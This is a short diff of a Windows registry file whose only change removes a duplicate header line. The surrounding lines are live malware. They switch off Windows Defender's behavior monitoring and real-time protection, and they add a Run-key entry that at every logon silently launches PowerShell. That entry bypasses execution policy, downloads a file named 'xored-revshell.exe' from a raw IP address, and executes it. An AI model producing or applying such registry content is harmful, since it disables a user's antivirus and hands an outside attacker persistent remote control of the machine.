@@ -8,7 +8,5 @@ Windows Registry Editor Version 5.00
 "DisableBehaviorMonitoring"=dword:00000001
 "DisableOnAccessProtection"=dword:00000001
 "DisableScanOnRealtimeEnable"=dword:00000001
-Windows Registry Editor Version 5.00
-
 [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
 "MyPersistentScript"="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://171.233.42.246:25555/xored-revshell.exe' -OutFile 'C:\\Users\\%username%\\VC.exe'; Start-Process 'C:\\Users\\%username%\\VC.exe'\""
